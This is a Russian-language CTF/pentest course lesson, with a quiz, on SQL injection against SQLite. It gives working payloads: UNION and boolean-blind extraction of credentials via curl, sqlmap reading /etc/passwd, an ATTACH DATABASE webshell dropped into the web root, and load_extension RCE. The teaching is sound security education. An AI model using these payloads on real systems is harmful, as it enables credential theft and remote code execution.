---
id: db-sqlite
title: "SQLite: инъекции на практике — sqlite_master и запись файлов"
category: web
parent: web-sqli-dbms-open
difficulty: medium
order: 2
tags: [sqli, sqlite, sqlite_master, attach, load_extension, mobile, sqlmap]
prerequisites: [web-sqli, web-sqli-dbms]
useful_for:
  - "CTF Web категория"
  - "Мобильные приложения (Android/iOS)"
  - "Десктопные приложения"
estimated_minutes: 40
summary: "SQLite от фингерпринта до записи файлов: sqlite_master, PRAGMA, UNION/blind, ATTACH DATABASE и load_extension."
---

SQLite — не сервер, а встраиваемая библиотека: база лежит файлом рядом с приложением. Её используют мобильные приложения (Android/iOS), десктоп-софт (браузеры, мессенджеры, IDE), маленькие веб-сервисы и IoT. Инъекции в SQLite часто встречаются в мобильных API и локальных приложениях, где нет `information_schema`, нет `SLEEP`, нет stacked-запросов — зато есть `sqlite_master` для метаданных и `ATTACH DATABASE` для записи файлов. Это самый «урезанный» диалект, и payload нужно строить соответственно.

## Фингерпринт и версия

Признаки SQLite: `SQLite3::SQLException`, `near "...": syntax error`, `no such table: ...`, `no such column: ...`, `unrecognized token`. Ошибки часто приходят из ORM (Rails, Django, Flask-SQLAlchemy) в виде `sqlite3.OperationalError`.

```sql
SELECT sqlite_version();          -- 3.45.1
SELECT sqlite_source_id();        -- 2024-01-30 ...
-- тип и версия
SELECT 1;
-- параметры сборки (какие функции включены)
SELECT * FROM pragma_compile_options();
```

Проверка через UNION:

```bash
curl -s "https://target/item?id=-1 UNION SELECT 1,sqlite_version(),3-- -"
```

Важно: SQLite **регистронезависим** для ключевых слов, но имена объектов чувствительны к регистру, если созданы в кавычках.

## Схема: sqlite_master и PRAGMA

Вся метаинформация — в таблице `sqlite_master` (алиас `sqlite_schema`). В ней: `type`, `name`, `tbl_name`, `sql`.

```sql
-- все объекты (таблицы, индексы, вьюхи, триггеры)
SELECT name FROM sqlite_master WHERE type='table';
SELECT sql FROM sqlite_master WHERE type='table';
-- структура таблицы users (CREATE-выражение)
SELECT sql FROM sqlite_master WHERE name='users';
```

`PRAGMA` даёт детали:

```sql
PRAGMA table_info(users);         -- колонки: cid, name, type, notnull, dflt_value, pk
PRAGMA database_list;             -- список подключённых БД (main, temp, ...)
PRAGMA table_info('users');
-- через table-valued-функции (SQLite 3.16+) — можно в UNION
SELECT name FROM pragma_table_info('users');
```

Агрегация — `GROUP_CONCAT` (как в MySQL):

```sql
SELECT GROUP_CONCAT(name, ',') FROM sqlite_master WHERE type='table';
SELECT GROUP_CONCAT(sql, ' | ') FROM sqlite_master WHERE type='table';
SELECT GROUP_CONCAT(username || ':' || password, char(10)) FROM users;
```

`char(10)` — перевод строки (в SQLite нет `0x0a`-конкатенации, но hex-литералы `X'...'` работают для BLOB).

## Извлечение данных: UNION и blind

**UNION-based** — стандартный путь, если вывод виден:

```bash
# число колонок
for n in 1 2 3 4; do echo -n "$n "; curl -s "https://target/item?id=1 ORDER BY $n-- -" | wc -c; done
# таблицы
curl -s "https://target/item?id=-1 UNION SELECT 1,GROUP_CONCAT(name),3 FROM sqlite_master WHERE type='table'-- -"
# данные
curl -s "https://target/item?id=-1 UNION SELECT 1,GROUP_CONCAT(username||':'||password),3 FROM users-- -"
```

**Boolean-blind** (задержек в SQLite нет — только логика):

```sql
1 AND 1=1
1 AND 1=2
1 AND SUBSTR((SELECT name FROM sqlite_master WHERE type='table' LIMIT 1),1,1)='u'
1 AND (SELECT LENGTH(sql) FROM sqlite_master WHERE type='table' LIMIT 1)>10
1 AND ASCII(SUBSTR((SELECT sql FROM sqlite_master WHERE name='users'),1,1))>100
```

`LIMIT n OFFSET m` работает как в MySQL. `SUBSTR(x,1,1)` — первый символ. `ASCII()` (он же `UNICODE()`) даёт код символа.

**Time-based — ОТСУТСТВУЕТ.** В SQLite нет `SLEEP`, `pg_sleep` или `WAITFOR`. Если ответ не различается по контенту и коду — остаются error-based (редко) и запись файлов / OOB через расширения. Не тратьте время на `SLEEP` — его нет.

## Запись файлов: ATTACH DATABASE

SQLite умеет писать файлы через `ATTACH DATABASE '<path>' AS x; CREATE TABLE x.y(...)`. Если процесс имеет права записи в каталог — можно создать webshell или перезаписать конфиг.

```sql
-- приаттачить новый файл как БД
ATTACH DATABASE '/var/www/html/shell.php' AS pwn;
-- создать таблицу, в которой будет наш PHP-код
CREATE TABLE pwn.s (c text);
INSERT INTO pwn.s VALUES ('<?php system($_GET["c"]); ?>');
-- файл /var/www/html/shell.php теперь содержит CREATE-выражение с нашим кодом
```

Хитрость: файл БД содержит не только данные, но и SQL-выражения `CREATE TABLE`. Чтобы PHP-код оказался в начале файла, имя таблицы/колонки формируют так, чтобы нужный фрагмент попал в заголовок. Практический приём — записать код как имя таблицы или через `pragma writable_schema`.

Через инъекцию (stacked `;` может не сработать — зависит от драйвера; в `sqlite3_exec` сработает):

```bash
curl -s "https://target/item?id=1;ATTACH DATABASE '/var/www/html/s.php' AS pwn;CREATE TABLE pwn.s(c text);INSERT INTO pwn.s VALUES('<?php system(\$_GET[c]); ?>');-- -"
```

Если каталог веб-корня недоступен, можно перезаписать `authorized_keys`, cron, или файл конфигурации самого приложения.

## RCE: load_extension

SQLite может загружать нативные `.so`/`.dll` через `load_extension()`. По умолчанию функция **выключена** в целях безопасности (`sqlite3_enable_load_extension`), но во многих сборках доступна.

```sql
SELECT load_extension('/tmp/evil.so');
SELECT load_extension('/tmp/evil.so', 'sqlite3_extension_init');
-- путь к расширению, уже лежащему на диске
SELECT load_extension('/usr/lib/sqlite3/pcre.so');
```

Требования:
- функция `load_extension` должна быть разрешена (`enable_load_extension(1)`);
- на диске должен лежать вредоносный `.so` с функцией-инициализатором;
- у процесса должны быть права на загрузку.

Если `load_extension` отключён, RCE через SQLite практически недостижим — переключайтесь на запись файлов (`ATTACH DATABASE`) или кражу данных. Полезная альтернатива — «SQLite-инъекция в приложение», где загружен `sqlite-vtfile`, `sqlite-shell` или похожие расширения.

## Особенности: нет сети, нет stacked, мобильные приложения

- **Нет сети.** В SQLite нет `UTL_HTTP`/`dblink`/`xp_dirtree`. OOB невозможен без внешних расширений.
- **Нет stacked-запросов через стандартный API.** `sqlite3_prepare_v2` компилирует ОДИН запрос; `;` даёт `sqlite3_prepare` только первый statement. Через `sqlite3_exec` — несколько. Многие ORM/драйверы (Python `sqlite3.execute`) позволяют только один запрос.
- **Инъекции в мобильных приложениях.** Android/iOS-приложения часто хранят данные в SQLite-файлах; инъекция встречается через локальные API, `content://`-провайдеры, экспортированные БД. Здесь важнее `adb`/`frida`, чем веб-payload.
- **Файл-ориентированность.** База — обычный файл; её можно скачать (через LFI, backup, `/data/data/<pkg>/databases/`) и разобрать локально.
- **Типы динамические.** SQLite не строго типизирован: колонка может хранить и число, и строку — UNION почти всегда «сходится» по типам.

## sqlite3 CLI и дамп

Локальный разбор скачанной базы:

```bash
# открыть
sqlite3 app.db

# внутри
.tables                       -- список таблиц
.schema users                 -- CREATE-выражение
.schema                       -- вся схема
.headers on
.mode column
SELECT * FROM users;
.dump                         -- полный SQL-дамп
.output dump.sql
.dump
.quit
```

Одной командой (неинтерактивно):

```bash
sqlite3 app.db ".tables"
sqlite3 app.db "SELECT name FROM sqlite_master WHERE type='table';"
sqlite3 app.db "SELECT username||':'||password FROM users;"
sqlite3 -header -column app.db "SELECT * FROM users LIMIT 5;"
# восстановить из дампа
sqlite3 new.db < dump.sql
```

Поиск строк/паролей по всему файлу:

```bash
strings app.db | grep -iE "pass|token|secret|flag"
```

sqlmap по SQLite:

```bash
sqlmap -u 'https://target/item?id=1' --batch --dbms=sqlite --dump
sqlmap -r request.txt -p id --batch --dbms=sqlite --tables
sqlmap -r request.txt -p id --batch --dbms=sqlite --file-read=/etc/passwd   # редко
```

## Разобранный пример: дамп через UNION

Цель: `https://notes.local/api/note?id=5` (Python/Flask + SQLite).

```bash
# Шаг 1. Ошибка
curl -s "https://notes.local/api/note?id=5'" | grep -iE "sqlite|syntax|no such"
# sqlite3.OperationalError: near "'": syntax error

# Шаг 2. Число колонок
for n in 1 2 3 4; do echo -n "$n "; curl -s "https://notes.local/api/note?id=1 ORDER BY $n-- -" | wc -c; done
# 1 220 / 2 220 / 3 220 / 4 18 -> 3

# Шаг 3. Версия
curl -s "https://notes.local/api/note?id=-1 UNION SELECT 1,sqlite_version(),3-- -"
# 3.45.1

# Шаг 4. Таблицы
curl -s "https://notes.local/api/note?id=-1 UNION SELECT 1,GROUP_CONCAT(name),3 FROM sqlite_master WHERE type='table'-- -"
# users,notes,sessions

# Шаг 5. Схема users
curl -s "https://notes.local/api/note?id=-1 UNION SELECT 1,sql,3 FROM sqlite_master WHERE name='users'-- -"
# CREATE TABLE users(id int, username text, password text, is_admin int)

# Шаг 6. Данные
curl -s "https://notes.local/api/note?id=-1 UNION SELECT 1,GROUP_CONCAT(username||':'||password),3 FROM users-- -"
# admin:5f4dcc3b5aa765d61d8327deb882cf99

# Шаг 7. Флаг (если есть отдельная таблица)
curl -s "https://notes.local/api/note?id=-1 UNION SELECT 1,GROUP_CONCAT(flag),3 FROM flags-- -"
```

## Частые ошибки

- **Ждать `SLEEP`.** В SQLite нет time-based blind — не тратьте время, используйте UNION/boolean.
- **Искать `information_schema`.** Метаданные только в `sqlite_master` (или `PRAGMA table_info`).
- **Рассчитывать на stacked-запросы.** Через `execute()` обычно нельзя выполнить второй запрос через `;`.
- **Забывать про динамическую типизацию.** В SQLite почти любой UNION проходит — используйте это, но проверяйте вывод.
- **Путать имена таблиц и файлов.** `sqlite_master` описывает объекты внутри файла, не другие базы.
- **Считать `load_extension` доступным.** В большинстве сборок он отключён; RCE через SQLite — редкость.
- **Не искать сам файл БД.** Иногда проще скачать `.db` (LFI/backup) и разобрать локально, чем эксплуатировать инъекцию.

## Полный справочник: команды, пейлоады, примитивы

Сводные таблицы: фингерпринт, клиентские команды, извлечение по техникам, файловые операции/RCE и «привилегии» (в SQLite их нет — есть только права файловой системы).

### (а) Фингерпринт и версия

| Команда/пейлоад | Что делает | Пример |
|-----------------|-----------|--------|
| `sqlite_version()` | версия библиотеки | `SELECT sqlite_version();` → `3.45.1` |
| `sqlite_source_id()` | id сборки исходников | `SELECT sqlite_source_id();` |
| `PRAGMA compile_options` | опции компиляции (что включено) | `SELECT * FROM pragma_compile_options;` |
| `pragma_module_list()` | доступные модули (FTS, JSON, …) | `SELECT * FROM pragma_module_list;` |
| `SELECT 1` | базовая проверка инъекции | `?id=1 AND 1=1-- -` |
| `SELECT sqlite_version()` в UNION | версия в выводе | `?id=-1 UNION SELECT 1,sqlite_version(),3-- -` |
| `PRAGMA database_list` | подключённые БД (main, temp) | `SELECT * FROM pragma_database_list;` |

Признак по ошибкам: `SQLite3::SQLException`, `near "...": syntax error`, `no such table:`, `no such column:`, `unrecognized token`, из ORM — `sqlite3.OperationalError`. Ключевые слова регистронезависимы; имена объектов — как созданы.

### (б) Клиентский CLI (sqlite3)

| Команда/флаг | Что делает | Пример |
|--------------|-----------|--------|
| `sqlite3 app.db` | открыть базу | `sqlite3 ./app.db` |
| `-header` / `-noheader` | вкл/выкл строку заголовков | `sqlite3 -header app.db 'SELECT * FROM users'` |
| `-column` | выровненный табличный вывод | `sqlite3 -header -column app.db 'SELECT * FROM users'` |
| `-csv` / `-tabs` / `-list` | CSV / табы / разделители | `sqlite3 -csv app.db 'SELECT * FROM users'` |
| `-json` | JSON-вывод | `sqlite3 -json app.db 'SELECT * FROM users'` |
| `-line` | «по столбцам» | `sqlite3 -line app.db 'SELECT * FROM users LIMIT 1'` |
| `-box` / `-table` / `-markdown` / `-html` / `-quote` / `-ascii` | прочие форматы вывода | `sqlite3 -box app.db '.tables'` |
| `-separator ','` | разделитель колонок | `sqlite3 -separator ',' app.db '...'` |
| `-newline SEP` | разделитель строк | |
| `-nullvalue TEXT` | что печатать вместо NULL | `sqlite3 -nullvalue 'NULL' app.db ...` |
| `-readonly` | открыть только для чтения | `sqlite3 -readonly app.db` |
| `-ifexists` | открыть, только если файл существует | `sqlite3 -ifexists app.db` |
| `-noinit` | не читать `~/.sqliterc` | `sqlite3 -noinit app.db` |
| `-init FILE` | выполнить файл при старте | `sqlite3 -init setup.sql app.db` |
| `-cmd CMD` | выполнить команду перед stdin | `sqlite3 -cmd '.mode csv' app.db` |
| `-batch` | форсировать пакетный режим | |
| `-echo` | печатать выполняемые запросы | |
| `-bail` | стоп при первой ошибке | |
| `-stats` | печатать статистику памяти | |
| `-A ARGS...` | выполнить `.archive ARGS` и выйти | `sqlite3 -A create -f a.zip app.db` |
| `-safe` / `-nonce STR` | безопасный режим и nonce | |
| `-vfs NAME` / `-zip` / `-append` | VFS / открыть как ZIP / дописать | |
| `-version` | версия sqlite3 | `sqlite3 -version` |
| `.tables` | список таблиц | |
| `.schema users` | CREATE-выражение таблицы | |
| `.schema` | вся схема | |
| `.dump` | полный SQL-дамп | `sqlite3 app.db .dump > dump.sql` |
| `.mode column` / `.headers on` | формат вывода | `.mode column` `.headers on` |
| `.output file` / `.once file` | вывод в файл | `.output out.txt` |
| `.import file table` | импорт CSV/TSV в таблицу | `.import data.csv users` |
| `.read file.sql` | выполнить SQL-файл | `.read init.sql` |
| `.backup file` / `.restore file` | онлайн-бэкап/восстановление | `.backup backup.db` |
| `.databases` | список подключённых БД | |
| `.indexes table` | индексы таблицы | |
| `.fullschema` | вся схема + статистика | |
| `.dbinfo` | статус базы (страницы, кодировка) | `.dbinfo` |
| `.dbtotxt` | hex-дамп файла базы | `.dbtotxt` |
| `.recover` | восстановить данные из повреждённой базы | `.recover` |
| `.clone NEWDB` | клонировать базу в новый файл | `.clone copy.db` |
| `.system CMD` / `.shell CMD` | выполнить команду ОС | `.system id` |
| `.load ./ext.so` | загрузить расширение | `.load ./pcre.so` |
| `.timer on` | тайминг | |
| `.quit` / `.exit` | выход | |

### (в) Извлечение данных по техникам

| Техника | Пейлоад | Пример |
|---------|---------|--------|
| UNION (число колонок) | `ORDER BY n` | `?id=1 ORDER BY 4-- -` |
| UNION (вывод) | `-1 UNION SELECT 1,2,3` | `?id=-1 UNION SELECT 1,sqlite_version(),3-- -` |
| UNION (схема) | `GROUP_CONCAT(name)` из `sqlite_master` | `?id=-1 UNION SELECT 1,GROUP_CONCAT(name),3 FROM sqlite_master WHERE type='table'-- -` |
| UNION (данные) | `GROUP_CONCAT(user\|\|':' \|\|pass)` | `?id=-1 UNION SELECT 1,GROUP_CONCAT(username\|\|':' \|\|password),3 FROM users-- -` |
| Метаданные | `PRAGMA table_info('users')` | `SELECT name FROM pragma_table_info('users')` |
| Схема | `SELECT sql FROM sqlite_master` | `?id=-1 UNION SELECT 1,sql,3 FROM sqlite_master WHERE name='users'-- -` |
| Boolean-blind | `AND 1=1` / `AND 1=2` | `?id=1 AND 1=2-- -` |
| Boolean-blind | `SUBSTR`/`ASCII` | `?id=1 AND ASCII(SUBSTR((SELECT sql FROM sqlite_master WHERE name='users'),1,1))>100-- -` |
| Boolean-blind | `LENGTH` | `?id=1 AND (SELECT LENGTH(sql) FROM sqlite_master WHERE type='table' LIMIT 1)>10-- -` |
| Time-based | — | **отсутствует** (нет `SLEEP`) |
| Error-based | — | крайне редко; используйте UNION/boolean |

### (г) Чтение/запись файлов и RCE

| Примитив | Что делает | Пример |
|----------|-----------|--------|
| `ATTACH DATABASE 'path' AS x` | создаёт/подключает файл-БД | `ATTACH DATABASE '/var/www/html/s.php' AS pwn;` |
| `CREATE TABLE pwn.s(c text)` + `INSERT` | пишет данные в файл | `CREATE TABLE pwn.s(c text); INSERT INTO pwn.s VALUES('<?php system($_GET["c"]); ?>');` |
| `VACUUM INTO 'path'` | копирует базу в новый файл | `VACUUM INTO '/var/www/html/out.db';` |
| `readfile('path')` | читает файл (CLI/расширение) | `SELECT readfile('/etc/passwd');` |
| `writefile('path',data)` | пишет файл (CLI/расширение) | `SELECT writefile('/tmp/x','data');` |
| `.output file` + `SELECT` | запись вывода в файл | `.output /tmp/out.txt` |
| `.import file table` | импорт файла | `.import /etc/passwd t` |
| `load_extension('x.so')` | загрузка нативного модуля → RCE | `SELECT load_extension('/tmp/evil.so');` |
| `.load ./x.so` | загрузка расширения в CLI | `.load ./evil.so` |
| `PRAGMA writable_schema=ON` | править `sqlite_master` напрямую | `PRAGMA writable_schema=ON; UPDATE sqlite_master SET sql='...' WHERE name='t';` |
| `.backup path` | пишет дамп в произвольный файл | `.backup /var/www/html/x.db` |

`load_extension` по умолчанию **выключен**; если включён — путь к RCE открыт. `ATTACH`/`VACUUM INTO`/`.backup` дают запись файлов без нативных модулей.

### (д) Привилегии

В SQLite **нет** пользователей, ролей и `GRANT` — вся модель доступа сводится к правам файловой системы на `.db`-файл.

| Команда | Что делает | Пример |
|---------|-----------|--------|
| `PRAGMA database_list` | какие файлы открыты и их пути | `SELECT * FROM pragma_database_list;` |
| `ls -l app.db` | права на файл (вне SQL) | `ls -la /data/app.db` |
| `id` / `whoami` | от кого работает процесс | `id` |
| `.dbinfo` | размер страниц, кодировка, версия | `.dbinfo` |
| `PRAGMA journal_mode` | режим журнала (WAL/delete) | `PRAGMA journal_mode;` |
| `PRAGMA page_count` / `page_size` | размер базы | `SELECT page_count*page_size FROM pragma_page_count(),pragma_page_size();` |

Практический вывод: «эскалация» в SQLite = запись в каталог, доступный процессу приложения (веб-корень, `.ssh`, cron). Проверяйте путь и владельца файла базы.

## Квиз

Выберите один вариант в каждом вопросе.

```quiz
- question: "Где в SQLite хранится список таблиц?"
  options:
    - "information_schema.tables"
    - "sqlite_master"
    - "all_tables"
    - "sys.objects"
  answer: 1
  explanation: "sqlite_master (он же sqlite_schema) содержит type, name, sql всех объектов."
- question: "Какой приём в SQLite позволяет писать файлы на диск?"
  options:
    - "INTO OUTFILE"
    - "COPY TO PROGRAM"
    - "ATTACH DATABASE ... CREATE TABLE"
    - "xp_cmdshell"
  answer: 2
  explanation: "ATTACH DATABASE создаёт новый файл-БД, куда можно записать данные."
- question: "Чего НЕТ в SQLite по сравнению с другими СУБД?"
  options:
    - "UNION"
    - "GROUP_CONCAT"
    - "time-based blind через SLEEP"
    - "boolean-blind"
  answer: 2
  explanation: "В SQLite нет функции задержки; time-based blind неприменим."
- question: "Какая функция SQLite потенциально даёт RCE?"
  options:
    - "load_extension"
    - "pg_read_file"
    - "UTL_HTTP"
    - "OPENROWSET"
  answer: 0
  explanation: "load_extension загружает нативный модуль, но часто отключён."
- question: "Где чаще всего встречаются SQLite-инъекции?"
  options:
    - "В корпоративных MSSQL-приложениях"
    - "В мобильных и десктопных приложениях"
    - "В Oracle ERP"
    - "В кластерах PostgreSQL"
  answer: 1
  explanation: "SQLite встроена в мобильные/десктоп-приложения и небольшие сервисы."
```

## Где пригодится

- **CTF (Web):** SQLite-задачи решаются через `sqlite_master` + UNION; часто база отдаётся как файл.
- **Мобильные приложения:** разбор `databases/*.db` через `adb pull` + `sqlite3` — стандартный шаг анализа Android/iOS.
- **Десктопные приложения:** локальные SQLite-базы хранят креды, историю, токены.
- **Работа (AppSec):** понимание `ATTACH DATABASE` и `load_extension` — основа безопасной конфигурации SQLite.
